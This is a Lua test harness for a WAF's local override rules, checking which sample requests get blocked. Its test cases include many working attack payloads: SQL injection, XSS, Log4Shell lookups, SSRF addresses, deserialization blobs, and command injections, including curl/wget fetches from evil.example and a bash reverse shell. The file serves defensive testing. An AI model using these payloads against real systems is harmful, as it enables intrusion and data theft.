-- Check config/waf-local-overrides.lua against sample requests, matched the way upstream anti_ddos_challenge.lua matches them.
-- Upstream compiles each rule into a PCRE regex for ngx.re.find; stock Lua has no PCRE, so Perl runs the compiled regexes here.
-- Every rule must block at least one case, so a rule that compiles but can never match fails the check.
-- The POST table is not exercised because it stays empty, see the comment above it.
dofile(arg[0]:gsub("[^/]*$", "") .. "../config/waf-local-overrides.lua")
local g = localized_global

-- Upstream's precompile_waf_*_table: the only Lua-pattern translation is %. into ".".
local function shim(p)
	return (p:gsub("^%%%.%%*", ".*"):gsub("%%%.%%*%$", ".*"):gsub("%%%.", "."))
end

local function bare(p)
	return (p:gsub("[%^%$]", ""))
end

local rules = { uri = {}, query = {}, header = {} }
for _, r in ipairs(g.WAF_URI_Request_table) do
	table.insert(rules.uri, { src = r[2], key = "^(?i)" .. bare(shim(r[1])) .. "$", val = "(?i)" .. shim(r[2]) })
end
for _, r in ipairs(g.WAF_query_string_Request_table) do
	local v = shim(r[2]):gsub("%%_", "_")
	v = (v == ".*" or v == "^.*$") and ".*" or v:gsub(" ", "[ +%%20]*")
	table.insert(
		rules.query,
		{ src = r[2], key = "^(?i)" .. bare(shim(r[1]):gsub("%%_", "_")) .. "$", val = "^(?i)" .. v .. "$" }
	)
end
for _, r in ipairs(g.WAF_Header_Request_table) do
	table.insert(rules.header, { src = r[2], raw = r[1], clean = bare(shim(r[1])), val = shim(r[2]) })
end
-- The User-Agent whitelist gets no shim: modes 1 and 4 become "((?i)<lowercased pattern>)", the others "(<pattern>)".
-- For this kind, "block" in the cases means the crawler skips the challenge.
rules.ua = {}
for _, r in ipairs(g.user_agent_whitelist_table) do
	local mode = r[2] or 1
	local val = (mode == 1 or mode == 4) and "((?i)" .. r[1]:lower() .. ")" or "(" .. r[1] .. ")"
	table.insert(rules.ua, { src = r[1], val = val })
end
-- The blacklist compiles the same way, and "block" means a 403 on every path; the list is empty, so every case must pass.
rules.uablock = {}
for _, r in ipairs(g.user_agent_blacklist_table) do
	local mode = r[2] or 1
	local val = (mode == 1 or mode == 4) and "((?i)" .. r[1]:lower() .. ")" or "(" .. r[1] .. ")"
	table.insert(rules.uablock, { src = r[1], val = val })
end
-- The waf_login map in nginx-waf.conf: "block" means the request is keyed into the waf_login rate limit.
rules.login = {}
for line in io.lines(arg[0]:gsub("[^/]*$", "") .. "../config/nginx-waf.conf") do
	local p = line:match('^%s*"~([^"]+)"%s+%$binary_remote_addr;')
	if p then
		table.insert(rules.login, { src = p, val = p })
	end
end

-- The first pass only records every regex and subject; Perl matches them all at once, and the second pass reads the results.
local asked, index, results = {}, {}, nil
local function re(subject, regex)
	local k = regex .. "\0" .. subject
	if not index[k] then
		table.insert(asked, { regex, subject })
		index[k] = #asked
	end
	return results == nil or results[index[k]] == "1"
end

local match = {
	uri = function(r, path)
		return path ~= "/" and re("https://example.com" .. path, r.key) and re(path, r.val)
	end,
	query = function(r, value, name)
		return re(name or "q", r.key) and re(value, r.val)
	end,
	header = function(r, name, value)
		return (name == r.clean or name == r.raw or re(name, r.raw)) and re(value, r.val)
	end,
	ua = function(r, value)
		return re(value, r.val)
	end,
	uablock = function(r, value)
		return re(value, r.val)
	end,
	login = function(r, value)
		return re(value, r.val)
	end,
}

local cases = {
	{ true, "uri", "/.env" },
	{ true, "uri", "/.htaccess" },
	{ true, "uri", "/.git/config" },
	{ true, "uri", "/wp-config.php.bak" },
	{ true, "uri", "/wp-admin/setup-config.php" },
	{ true, "uri", "/configuration.php" },
	{ true, "uri", "/wp-content/cache/page.html" },
	{ false, "uri", "/2025/11/cache-invalidation-tips/" },
	{ false, "uri", "/cached-pages/" },
	{ true, "uri", "/composer.json" },
	{ true, "uri", "/composer.lock" },
	{ true, "uri", "/wp-content/debug.log" },
	{ true, "uri", "/wp-content/uploads/2025/01/shell.php" },
	{ true, "uri", "/wp-admin/includes/admin.php" },
	{ true, "uri", "/wp-includes/version.php" },
	{ true, "uri", "/readme.html" },
	{ true, "uri", "/xmlrpc.php" },
	{ true, "uri", "/wp-admin/install.php" },
	{ true, "uri", "/install/index.php" },
	{ true, "uri", "/upgrade/index.php" },
	{ true, "uri", "/config/database.php" },
	{ true, "uri", "/sysconfig.local.inc.php" },
	{ true, "uri", "/ucnode.inc.php" },
	{ true, "uri", "/repository/shell.php" },
	{ true, "uri", "/files/shell.php" },
	{ true, "uri", "/wp-content/uploads/2025/01/shell.phtml" },
	{ true, "uri", "/wp-content/uploads/2025/01/shell.php5" },
	{ true, "uri", "/wp-content/uploads/2025/01/avatar.php.jpg" },
	{ true, "uri", "/wp-content/uploads/2025/01/avatar.jpg/x.php" },
	{ true, "uri", "/files/images/x.phar" },
	{ true, "uri", "/repository/shell.jsp;.png" },
	{ true, "uri", "/files/shell.JSPX" },
	{ true, "uri", "/files/cmd.aspx" },
	{ true, "uri", "/repository/cmd.asp%00.pdf" },
	{ true, "uri", "/repository/x.cgi" },
	{ true, "uri", "/files/x.pl" },
	{ true, "uri", "/files/att/x.sh" },
	{ true, "uri", "/solr/search/select" },
	{ true, "uri", "/jolokia/list" },
	{ true, "uri", "/host-manager/html" },
	{ true, "uri", "/xmlui/WEB-INF/web.xml" },
	{ true, "uri", "/META-INF/context.xml" },
	{ true, "uri", "/actuator/health" },
	{ true, "uri", "/static/../../etc/passwd" },
	{ true, "uri", "/xmlui/..;/manager/html" },
	{ true, "uri", "/manager;x/html" },
	{ true, "uri", "/xmlui/%2e%2e;/admin/" },
	{ true, "uri", "/server/actuator;/env" },
	{ true, "uri", "/images/docs/shell.php" },
	{ true, "uri", "/images/persons/shell.php5" },
	{ true, "uri", "/images/docs/avatar.php.jpg" },
	{ true, "uri", "/install" },
	{ true, "uri", "/install;x" },
	{ true, "uri", "/upgrade" },
	{ true, "uri", "/solr" },
	{ true, "uri", "/jolokia" },
	{ true, "uri", "/jolokia;x" },
	{ true, "uri", "/manager" },
	{ true, "uri", "/host-manager" },
	{ true, "uri", "/actuator" },
	{ true, "uri", "/server/actuator" },
	{ true, "uri", "/actuator;x" },
	{ true, "uri", "/WEB-INF" },
	{ true, "uri", "/META-INF;x" },
	{ true, "uri", "/static/%2e%2e/%2e%2e/etc/passwd" },
	{ true, "uri", "/app/foo/..%2f..%2fsecret.txt" },
	{ true, "uri", "/app/foo/.%2E%5cWEB-INF/web.xml" },
	{ true, "uri", "/app/foo/..\\web.xml" },
	{ false, "uri", "/images/docs/cover.jpg" },
	{ false, "uri", "/images/persons/photo.png" },
	{ false, "uri", "/images/docs/thesis.php-guide.pdf" },
	{ false, "uri", "/wp-content/themes/x/images/thumb.php" },
	{ false, "uri", "/actuator-design/" },
	{ false, "uri", "/managerial-accounting/" },
	{ false, "uri", "/solar-energy/" },
	{ false, "uri", "/solr-guide/" },
	{ false, "uri", "/install-guide/" },
	{ false, "uri", "/files/report..pdf" },
	{ false, "uri", "/" },
	{ false, "uri", "/about/" },
	{ false, "uri", "/environmental-science/" },
	{ false, "uri", "/xmlui/handle/123456789/1;jsessionid=0A1B2C" },
	{ false, "uri", "/bitstream/handle/123456789/1/report.pdf" },
	{ false, "uri", "/installing-slims-on-ubuntu/" },
	{ false, "uri", "/wp-content/themes/twentytwentyfive/style.css" },
	{ false, "uri", "/wp-content/uploads/2025/01/photo.jpg" },
	{ false, "uri", "/files/att/report.plan.pdf" },
	{ false, "uri", "/repository/Shell_scripting.pdf" },
	{ false, "uri", "/files/images/photo.shot.png" },
	{ false, "uri", "/wp-content/uploads/2025/01/cgi-guide.pdf" },
	{ false, "uri", "/repository/aspect-ratio.pdf" },
	{ false, "uri", "/files/images/docs/thesis.php-guide.pdf" },
	{ true, "query", "1 union select 1,2" },
	{ true, "query", "-1 UNION ALL SELECT" },
	{ true, "query", "1/**/UnIoN/**/SeLeCt/**/1" },
	{ true, "query", "1\nunion\nselect 1" },
	{ true, "query", "1union select 1" },
	{ true, "query", "' or '1'='1" },
	{ true, "query", "admin' or 1=1-- -" },
	{ true, "query", "1\nAND\n1=2" },
	{ true, "query", "admin'-- " },
	{ true, "query", "admin'#" },
	{ true, "query", "1 AND BENCHMARK(5000000,MD5(1))" },
	{ true, "query", "1;select pg_sleep(5)" },
	{ true, "query", "1 and ascii(char(97))>1" },
	{ true, "query", "concat(0x7e,version())" },
	{ true, "query", "concat (user())" },
	{ true, "query", "' AND (SELECT SUBSTRING(user_pass,1,1) FROM wp_users WHERE ID=1)='a" },
	{ true, "query", "1 AND 1=(SELECT COUNT(*) FROM information_schema.tables)" },
	{ true, "query", "1 into outfile '/var/www/x.php'" },
	{ true, "query", "1 and dbms_pipe.receive_message('a',5)=1" },
	{ true, "query", "1 or 1" },
	{ true, "query", "1 or true" },
	{ true, "query", "1 || 1" },
	{ true, "query", "-1 or 1--" },
	{ true, "query", "1 and ascii(substr(password,1,1))>64" },
	{ true, "query", "1 and ord(mid(user_pass,1,1))>64" },
	{ true, "query", "1 and unhex(41)" },
	{ true, "query", "')/**/AND/**/('Bqsyzi'='BqsyZi''" },
	{ true, "query", ")/**/AND/**/(962712334=962712334'" },
	{ true, "query", "1/**/or/**/1" },
	{ true, "query", "subject' ORDER BY 1-- -" },
	{ true, "query", "Kaempferol 3-O-rutinoside ORDER BY 1-- -" },
	{ true, "query", "equals' ORDER BY 1000-- -" },
	{ true, "query", "1/**/ORDER/**/BY/**/3#" },
	{ true, "query", "1 AND SLEEP/**/(5)" },
	{ true, "query", "1 AND BENCHMARK/**/(5000000,MD5(1))" },
	{ true, "query", "1 AND (/*!50000SELECT*/1)" },
	{ true, "query", "1 AND (/*!50000 SELECT*/1)" },
	{ true, "query", "1 INTO/**/OUTFILE '/var/www/x.php'" },
	{ true, "query", "1 AND USER/**/()" },
	{ true, "query", "title,(select sleep(5))", "orderby" },
	{ true, "query", "(CASE WHEN 1=1 THEN title ELSE date END)", "orderby" },
	{ true, "query", "desc;", "order" },
	{ true, "query", "1 UNION SELECT 1,2,3-- -", "q[a\nb]" },
	{ true, "query", "<script>alert(1)</script>", "x\ny" },
	{ true, "query", "(CASE WHEN 1=1 THEN title ELSE date END)", " orderby" },
	{ true, "query", "(CASE WHEN 1=1 THEN title ELSE date END)", "order.by" },
	{ true, "query", "(CASE WHEN 1=1 THEN title ELSE date END)", "sort by" },
	{ true, "query", "base64_decode(x)" },
	{ true, "query", "base64_encode(x)" },
	{ true, "query", "php://filter/convert.base64-encode/resource=index" },
	{ true, "query", "data://text/plain;base64,PD9waHA=" },
	{ true, "query", "../../../../etc/passwd" },
	{ true, "query", "../WEB-INF/web.xml" },
	{ true, "query", "/etc/passwd" },
	{ true, "query", "/etc/shadow" },
	{ true, "query", "file=/etc/hosts" },
	{ true, "query", "/proc/self/environ" },
	{ true, "query", "/etc/./passwd" },
	{ true, "query", "/etc//passwd" },
	{ true, "query", "c:\\windows\\win.ini" },
	{ true, "query", "${jndi:ldap://x/a}" },
	{ true, "query", "${${lower:j}ndi:ldap://x/a}" },
	{ true, "query", "${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}" },
	{ true, "query", "${${" .. ("a"):rep(1500) .. ":-j}ndi:ldap://x/a}" },
	{ true, "query", "${jndi:ldap://x/a}" .. ("${"):rep(4000) },
	{ true, "query", "${a} ${b${c:d}" },
	{ true, "query", "<script>alert(1)</script>" },
	{ true, "query", '"><svg/onload=alert(1)>' },
	{ true, "query", "<img src=x onerror=alert(1)>" },
	{ true, "query", "<x onclick=alert(1)>click</x>" },
	{ true, "query", '" autofocus onfocus=alert(1) x="' },
	{ true, "query", "' onmouseover=alert(1) '" },
	{ true, "query", '<a href="javascript:alert(1)">x</a>' },
	{ true, "query", "x' href=javascript:alert(1) '" },
	{ true, "query", "javascript:alert(document.cookie)" },
	{ true, "query", "JaVaScRiPt: alert(1)" },
	{ true, "query", "javascript://\nalert(1)" },
	{ true, "query", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" },
	{ true, "query", ";id" },
	{ true, "query", "| cat /etc/passwd" },
	{ true, "query", "$(whoami)" },
	{ true, "query", "`id`" },
	{ true, "query", "1;sleep 5" },
	{ true, "query", "x && curl http://evil.example/s.sh" },
	{ true, "query", ";wget evil.example/x.sh" },
	{ true, "query", "1|ping -c 3 203.0.113.1" },
	{ true, "query", "127.0.0.1&cat /etc/passwd" },
	{ true, "query", "1&ping -c 3 evil.example" },
	{ true, "query", "x&wget evil.example/x.sh" },
	{ true, "query", "x & curl http://evil.example/s.sh" },
	{ true, "query", "/bin/bash -i >& /dev/tcp/203.0.113.1/4444 0>&1" },
	{ true, "query", "cat${IFS}/etc/passwd" },
	{ true, "query", "() { :; }; echo vulnerable" },
	{ true, "query", "cmd.exe /c whoami" },
	{ true, "query", "powershell -enc SQBFAFgA" },
	{ true, "query", "http://169.254.169.254/latest/meta-data/" },
	{ true, "query", "http://localhost:8080/manager/html" },
	{ true, "query", "gopher://127.0.0.1:6379/_FLUSHALL" },
	{ true, "query", "file:///etc/passwd" },
	{ true, "query", "http://[::1]/" },
	{ true, "query", "http://[::ffff:127.0.0.1]/" },
	{ true, "query", "http://0x7f000001/" },
	{ true, "query", "http://2130706433/" },
	{ true, "query", "http://0177.0.0.1/" },
	{ true, "query", "http://evil.example@127.0.0.1/" },
	{ true, "query", "dict://localhost:11211/stats" },
	{ true, "query", "http://metadata.google.internal/computeMetadata/v1/" },
	{ true, "query", "https://192.168.1.1/admin" },
	{ true, "query", "http://172.16.0.5:8080/" },
	{ true, "query", "jar:http://evil.example/x.jar!/" },
	{ true, "query", "http://127.1/" },
	{ true, "query", "http://127.0.0.1./" },
	{ true, "query", "http://localhost./" },
	{ true, "query", "http://0x7f.1/" },
	{ true, "query", "http://0/" },
	{ false, "query", "http://127.0.0.10.example.com/" },
	{ true, "query", "file:/opt/dspace/config/local.cfg" },
	{ true, "query", "jar:file:/opt/dspace/config/local.cfg!/" },
	{ true, "query", "http://127.0x0.1/" },
	{ true, "query", "http://169.0xfe.169.254/latest/meta-data/" },
	{ true, "query", "http://192.0xa8.1.1/" },
	{ true, "query", "http://172.020.0.1/" },
	{ true, "query", "http://10.0x0.1/" },
	{ true, "query", "http://0177.0x0.0.1/" },
	{ true, "query", "http://a@b@127.0.0.1/" },
	{ false, "query", "http://a@b@example.com/" },
	{ false, "query", "File: local repository guide" },
	{ true, "query", '"onfocus=alert(1) autofocus="' },
	{ true, "query", "'onmouseover=alert(1) x='" },
	{ true, "query", "java\tscript:alert(1)" },
	{ true, "query", "java\nscript:alert(1)" },
	{ true, "query", '<a href="java\tscript:alert(1)">x</a>' },
	{ true, "query", ";cat config/database.php" },
	{ true, "query", "x&cat config/sysconfig.local.inc.php" },
	{ false, "query", "Animal behaviour; cat/dog breeds" },
	{ false, "query", "Dogs; cat food/treats" },
	{ false, "query", "Dogs & cat food/treats" },
	{ true, "query", "<?php system($_GET['c']); ?>" },
	{ true, "query", "<?= system($_GET[0]) ?>" },
	{ true, "query", '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:/opt/dspace/config/local.cfg">]>' },
	{ true, "query", '<!ENTITY xxe SYSTEM "http://evil.example/x">' },
	{ true, "query", "${T(java.lang.Runtime).getRuntime().exec('id')}" },
	{ true, "query", "#{T(java.lang.Runtime).getRuntime().exec('id')}" },
	{ false, "query", '<?xml version="1.0"?>' },
	{ false, "query", "java.lang.Runtime tutorial" },
	{ true, "query", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==" },
	{ true, "query", "aced00057372" },
	{ true, "query", "x=rO0ABXNy" },
	{ true, "query", '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x/a"}' },
	{ true, "query", 'O:8:"stdClass":0:{}' },
	{ true, "query", 'a:1:{i:0;O:9:"Evil\\Cls":1:{s:1:"x";s:2:"id";}}' },
	{ true, "query", 'O:+8:"stdClass":0:{}' },
	{ true, "query", "phar://./uploads/avatar.jpg" },
	{ true, "query", "<%= 7*7 %>" },
	{ true, "query", 'server.createobject("wscript.shell")' },
	{ true, "query", 'eval request("cmd")' },
	{ false, "query", "trade union selection" },
	{ false, "query", "sejarah perpustakaan indonesia" },
	{ false, "query", "2025-01-31" },
	{ false, "query", "Teachers' and students' perceptions of e-learning" },
	{ false, "query", "O'Reilly and Associates" },
	{ false, "query", "Syafi'i and fiqh" },
	{ false, "query", "don't -- just do it" },
	{ false, "query", "select committee report" },
	{ false, "query", "sleep quality among students" },
	{ false, "query", "benchmarking library services" },
	{ false, "query", "user experience (UX) design" },
	{ false, "query", "C# programming" },
	{ false, "query", "pengaruh motivasi 1990 and 2000" },
	{ false, "query", '"climate change" AND title:(water OR air)' },
	{ false, "query", 'title:("machine learning") AND dateIssued:[2010 TO 2020]' },
	{ false, "query", "1 or 2" },
	{ false, "query", "1 and 2 Samuel" },
	{ false, "query", "type 1 or 2 diabetes" },
	{ false, "query", "ASCII (American Standard Code for Information Interchange)" },
	{ false, "query", "Substring (computer science)" },
	{ false, "query", "Lord (of the rings)" },
	{ false, "query", "mid (2020) report" },
	{ false, "query", "Law and order by 1998 standards" },
	{ false, "query", "sorted in order by 2 criteria" },
	{ false, "query", "C/C++ comments /* like this */ and more" },
	{ false, "query", "Users (2020) of the library" },
	{ false, "query", "Kaempferol 3-O-rutinoside" },
	{ false, "query", "etc. passwords policy" },
	{ false, "query", "etc/passwords" },
	{ false, "query", "Hosts file configuration on Linux" },
	{ false, "query", "https://example.com/wp-admin/edit.php?orderby=title&order=asc", "redirect_to" },
	{ false, "query", "DESC", "order" },
	{ false, "query", "menu_order title", "orderby" },
	{ false, "query", "price-desc", "orderby" },
	{ false, "query", "dc.date.issued_dt", "sort_by" },
	{ false, "query", "O'Brien (1)", "order_id" },
	{ false, "query", "O'Brien (1)", " order_id" },
	{ false, "query", "menu_order title", " orderby" },
	{ false, "query", "${a} and ${b}" },
	{ false, "query", "ratio 50:50 ${x}" },
	{ false, "query", ("${:"):rep(2666) },
	{ false, "query", "JavaScript: The Good Parts" },
	{ false, "query", 'learning "javascript: the definitive guide"' },
	{ false, "query", "Teachers' online learning" },
	{ false, "query", '"climate change" ontology' },
	{ false, "query", "it's on sale = cheap" },
	{ false, "query", "p<0.05 significance level" },
	{ false, "query", "x < y and online = true" },
	{ false, "query", "<<Sejarah>> perpustakaan" },
	{ false, "query", "Data: text mining in libraries" },
	{ false, "query", "Animal behaviour; cat breeds" },
	{ false, "query", "Table tennis; ping pong" },
	{ false, "query", "Monty Python; python programming" },
	{ false, "query", "Music; cd collection" },
	{ false, "query", "Tom & Jerry" },
	{ false, "query", "R&D; AT&T" },
	{ false, "query", "salt & pepper; cat litter" },
	{ false, "query", "Q&A sessions & ping pong" },
	{ false, "query", "Data Science dengan R & Python" },
	{ false, "query", "HTML, CSS & PHP 8" },
	{ false, "query", "The Ego & Id" },
	{ false, "query", "Anxiety & sleep" },
	{ false, "query", "Membaca diagram P&ID" },
	{ false, "query", "Belajar Ruby & Python - Panduan Lengkap" },
	{ false, "query", "Pemrograman (Ruby & Python)" },
	{ false, "query", "Anxiety & sleep; a review" },
	{ false, "query", "Learning JavaScript: (2nd edition)" },
	{ false, "query", 'Crockford JavaScript: "the good parts"' },
	{ false, "query", "https://lib.example.ac.id/index.php?p=show_detail&id=12&keywords=x", "redirect" },
	{ false, "query", "C++ | Java programming" },
	{ false, "query", "Freud: ego and id" },
	{ false, "query", "http://hdl.handle.net/123456789/1", "redirect" },
	{ false, "query", "https://doi.org/10.1016/j.lisr.2020.101" },
	{ false, "query", "The bell jar: a novel" },
	{ false, "query", "MToxMDB8Mjp8Mzp8NDp8NTpvYWlfZGM=", "resumptionToken" },
	{ false, "query", "abcrO0ABxyz" },
	{ false, "query", "a:2:{i:0;i:7;i:1;i:9;}" },
	{ false, "query", "Bab 2: Pendahuluan" },
	{ false, "query", "Response writing in academic papers" },
	{ false, "query", "100% renewable energy" },
	{ true, "header", "user-agent", "${jndi:ldap://x/a}" },
	{ true, "header", "cookie", "a=<script>alert(1)</script>" },
	{ true, "header", "cookie", "wp_lang=1 union select 1" },
	{ true, "header", "x-forwarded-for", "1.2.3.4' AND SLEEP(5)-- -" },
	{ true, "header", "x-forwarded-for", "1.2.3.4' AND SLEEP/**/(5)-- -" },
	{ true, "header", "x-forwarded-host", "evil.example/x" },
	{ false, "header", "cookie", "wordpress_logged_in_abc=admin%7C1700000000" },
	{ false, "header", "cookie", "SenayanMember=abc123; SenayanAdmin=def456" },
	{ false, "header", "user-agent", "Mozilla/5.0 (X11; Linux x86_64)" },
	{ false, "header", "referer", "https://lib.example.ac.id/index.php?keywords=trade+union+selection" },
	{ false, "header", "x-forwarded-for", "203.0.113.7, 10.0.0.1" },
	{ true, "header", "referer", "https://evil.example/?q=<script>alert(1)</script>" },
	{ true, "header", "user-agent", "<img src=x onerror=alert(1)>" },
	{ true, "header", "cookie", "q=%3Cscript%3Ealert(1)%3C/script%3E" },
	{ true, "header", "referer", "https://evil.example/?q=%3Cx%20onclick%3Dalert(1)%3E" },
	{ true, "header", "cookie", "JSESSIONID=1; rememberMe=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ" },
	{ true, "header", "x-session", "aced0005737200" },
	{ true, "header", "cookie", "pref=O%3A8%3A%22stdClass%22%3A0%3A%7B%7D" },
	{ true, "header", "cookie", "pref=O%3A%2B8%3A%22stdClass%22%3A0%3A%7B%7D" },
	{ true, "header", "cookie", "f=phar%3A%2F%2F./uploads/a.jpg" },
	{ true, "header", "user-agent", "<?php system($_GET['c']); ?>" },
	{ true, "header", "x-custom", "${T(java.lang.Runtime).getRuntime().exec('id')}" },
	{ false, "header", "accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" },
	{ true, "header", "user-agent", "() { :; }; /bin/bash -c 'id'" },
	{ true, "header", "x-api-version", "${${env:NaN:-j}ndi${env:NaN:-:}ldap://x/a}" },
	{ false, "header", "x-template", "${a} and ${b}" },
	{ false, "header", "cookie", "wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce" },
	{ false, "header", "cookie", "session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2ln" },
	{ false, "header", "cookie", "token=xyzrO0ABabc" },
	{
		false,
		"header",
		"user-agent",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
	},
	{ true, "ua", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
	{
		true,
		"ua",
		"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	},
	{ true, "ua", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" },
	{
		true,
		"ua",
		"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/130.0.0.0 Safari/537.36",
	},
	{
		false,
		"ua",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
	},
	{ false, "ua", "Googlebot" },
	{ false, "ua", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com.evil.example/bot.html)" },
	{ true, "ua", "Turnitin (https://bit.ly/2UvnfoQ)" },
	{ false, "ua", "Mozilla/5.0 Turnitin (https://bit.ly/2UvnfoQ)" },
	-- No User-Agent is blocked for what it is, because every 403 counts toward a ban, which only attack payloads may cause.
	{ false, "uablock", "" },
	{
		false,
		"uablock",
		"Kodi/21.2 (X11; Linux x86_64) Ubuntu/24.04 App_Bitness/64 Version/21.2-(21.2.0)-Git:20250204",
	},
	{ false, "uablock", "XBMC/12.0 (Linux)" },
	{ false, "uablock", "WinHttp-Autoproxy-Service/5.1" },
	{ false, "uablock", "Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)" },
	{ false, "uablock", "libwww-perl/6.72" },
	{
		false,
		"uablock",
		"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot",
	},
	{
		false,
		"uablock",
		"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)",
	},
	{ false, "uablock", "DeepseekBot/1.0" },
	{
		false,
		"uablock",
		"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; OAI-SearchBot/1.0; +https://openai.com/searchbot",
	},
	{ false, "uablock", "Mozilla/5.0 (compatible) AI2Bot (+https://www.allenai.org/crawler)" },
	{
		false,
		"uablock",
		"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Claude-User/1.0; +claude-user@anthropic.com)",
	},
	{ false, "uablock", "curl/8.5.0" },
	{ false, "uablock", "python-requests/2.32.3" },
	{ false, "uablock", "OAI-Harvester/1.0" },
	{ false, "uablock", "Turnitin (https://bit.ly/2UvnfoQ)" },
	{
		false,
		"uablock",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
	},
	{ true, "login", "POST:/wp-login.php" },
	{ true, "login", "POST:/blog/wp-login.php" },
	{ true, "login", "POST:/index.php" },
	{ true, "login", "POST:/slims/index.php" },
	{ true, "login", "POST:/password-login" },
	{ true, "login", "POST:/xmlui/password-login" },
	{ true, "login", "POST:/rest/login" },
	{ true, "login", "POST:/server/api/authn/login" },
	{ false, "login", "GET:/wp-login.php" },
	{ false, "login", "POST:/wp-login.php.bak" },
	{ false, "login", "POST:/wp-admin/admin-ajax.php" },
	{ false, "login", "POST:/wp-admin/index.php" },
	{ false, "login", "POST:/admin/index.php" },
	{ false, "login", "POST:/admin/modules/bibliography/index.php" },
	{ false, "login", "POST:/handle/123456789/1" },
}

local function hits(c)
	local found = {}
	for _, r in ipairs(rules[c[2]]) do
		if match[c[2]](r, c[3], c[4]) then
			table.insert(found, r)
		end
	end
	return found
end

for _, c in ipairs(cases) do
	hits(c)
end

local function hex(s)
	return (s:gsub(".", function(ch)
		return string.format("%02x", ch:byte())
	end))
end

local tmp = os.tmpname()
local f = assert(io.open(tmp, "w"))
for _, a in ipairs(asked) do
	f:write(hex(a[1]), "\t", hex(a[2]), "\n")
end
f:close()
local perl = assert(
	io.popen(
		[[perl -ne 'chomp; my ($r, $s) = map { pack "H*", $_ } split /\t/, $_, -1; my $m = eval { $s =~ /$r/ ? 1 : 0 }; print defined $m ? $m : "E", "\n"' < ]]
			.. tmp
	)
)
results = {}
for line in perl:lines() do
	table.insert(results, line)
end
perl:close()
os.remove(tmp)
assert(#results == #asked, "perl returned " .. #results .. " results for " .. #asked .. " regexes")

local failed = 0
local seen = {}
for i, a in ipairs(asked) do
	if results[i] == "E" and not seen[a[1]] then
		seen[a[1]] = true
		failed = failed + 1
		print(string.format("FAIL regex does not compile: %s", a[1]))
	end
end

local used = {}
for _, c in ipairs(cases) do
	local found = hits(c)
	for _, r in ipairs(found) do
		used[r] = true
	end
	if (#found > 0) ~= c[1] then
		failed = failed + 1
		print(
			string.format(
				"FAIL %s %q%s: expected %s",
				c[2],
				c[3],
				c[4] and " " .. string.format("%q", c[4]) or "",
				c[1] and "block" or "pass"
			)
		)
	end
end
for kind, list in pairs(rules) do
	for _, r in ipairs(list) do
		if not used[r] then
			failed = failed + 1
			print(string.format("FAIL %s rule blocks no case: %s", kind, r.src))
		end
	end
end

local body_skip_cases = {
	{ true, "/wp-admin/post.php" },
	{ true, "/wp-json/wp/v2/posts/12" },
	{ false, "/wp-admin/admin-ajax.php" },
	{ false, "/wp-admin/post.php/x" },
	{ false, "/x/wp-admin/post.php" },
	{ false, "/wp-json/contact-form-7/v1/contact-forms/5/feedback" },
}
local body_skip_used = {}
for _, c in ipairs(body_skip_cases) do
	local hit = false
	for _, p in ipairs(g.WAF_body_skip) do
		if c[2]:find(p) then
			hit = true
			body_skip_used[p] = true
		end
	end
	if hit ~= c[1] then
		failed = failed + 1
		print(string.format("FAIL body skip %q: expected %s", c[2], c[1] and "skip" or "check"))
	end
end
for _, p in ipairs(g.WAF_body_skip) do
	if not body_skip_used[p] then
		failed = failed + 1
		print(string.format("FAIL body skip pattern matches no case: %s", p))
	end
end

local cookie_skip_cases = {
	{ true, "sl-session" },
	{ false, "sl-sessionx" },
	{ false, "xsl-session" },
	{ false, "JSESSIONID" },
}
local cookie_skip_used = {}
for _, c in ipairs(cookie_skip_cases) do
	local hit = false
	for _, p in ipairs(g.WAF_cookie_skip or {}) do
		if c[2]:find(p) then
			hit = true
			cookie_skip_used[p] = true
		end
	end
	if hit ~= c[1] then
		failed = failed + 1
		print(string.format("FAIL cookie skip %q: expected %s", c[2], c[1] and "skip" or "check"))
	end
end
for _, p in ipairs(g.WAF_cookie_skip or {}) do
	if not cookie_skip_used[p] then
		failed = failed + 1
		print(string.format("FAIL cookie skip pattern matches no case: %s", p))
	end
end

-- Upstream builds its default anti_ddos_table in the worker before it calls the override, so both run here against the real upstream source.
local upstream = assert(io.open(arg[0]:gsub("[^/]*$", "") .. "../lua/anti_ddos_challenge.lua")):read("a")
local from = assert(
	upstream:find("if not config_store.anti_ddos_table then", 1, true),
	"upstream default anti_ddos_table not found"
)
local to = assert(
	upstream:find("\nlocalized.anti_ddos_table = function()", from, true),
	"end of upstream default anti_ddos_table not found"
)
local any = setmetatable({}, {
	__index = function(t)
		return t
	end,
})
local store = {}
assert(load(upstream:sub(from, to), "anti_ddos_table", "t", { localized = any, config_store = store }))()
